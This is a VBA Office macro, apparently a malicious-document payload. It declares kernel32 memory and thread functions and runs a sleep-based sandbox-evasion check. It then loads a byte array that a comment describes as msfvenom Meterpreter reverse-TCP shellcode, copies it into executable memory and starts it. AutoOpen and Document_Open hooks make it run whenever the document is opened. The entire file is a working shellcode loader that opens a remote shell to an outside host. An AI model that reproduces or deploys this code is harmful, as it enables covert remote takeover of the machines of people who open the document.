Private Declare Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As Long, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As Long

Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
    ByVal Destination As Long, _
    ByRef Source As Byte, _
    ByVal Length As Long)

Private Declare Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As Long, _
    ByVal lpParameter As Long, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As Long) As Long

Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Function MyMacro()
    Dim buf As Variant
    Dim addr As Long
    Dim counter As Long
    Dim b As Byte
    Dim threadId As Long

    ' Anti-sandbox sleep check
    Dim t1 As Date, t2 As Date, timeDiff As Long
    t1 = Now()
    Sleep 2000
    t2 = Now()
    timeDiff = DateDiff("s", t1, t2)
    If timeDiff < 2 Then Exit Function

    ' Your shellcode here, i used msfvenom -p windows/meterpreter/reverse_tcp LHOST LPORT prependmigrateproc=explorer.exe prependmigrate=true -f vbapplication
    buf = Array(252, 232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 80, 139, 88, 32, 139, 72, 24, 1, 211, 133, 201, 116, 60, 49, 255, 73, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, 104, 76, 119, 38, 7, 137, 232, 255, 208, 184, 144, 1, 0, 0, 41, 196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 10, 104, 192, 168, 45, 200, 104, 2, 0, 1, 187, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 10, 255, 78, 8, 117, 236, 232, 103, 0, 0, 0, 106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 126, 54, 139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, 83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 131, 248, 0, 125, 40, 88, 104, 0, 64, 0, 0, 106, 0, 80, 104, 11, 47, 15, 48, 255, 213, 87, 104, 117, 110, 77, 97, 255, 213, 94, 94, 255, 12, 36, 15, 133, 112, 255, 255, 255, 233, 155, 255, 255, 255, 1, 195, 41, 198, 117, 193, 195, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)

    ' Allocate memory
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' Copy shellcode into memory
    For counter = LBound(buf) To UBound(buf)
        b = buf(counter)
        RtlMoveMemory addr + counter, b, 1
    Next counter

    ' Execute shellcode
    CreateThread 0, 0, addr, 0, 0, threadId
End Function

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub
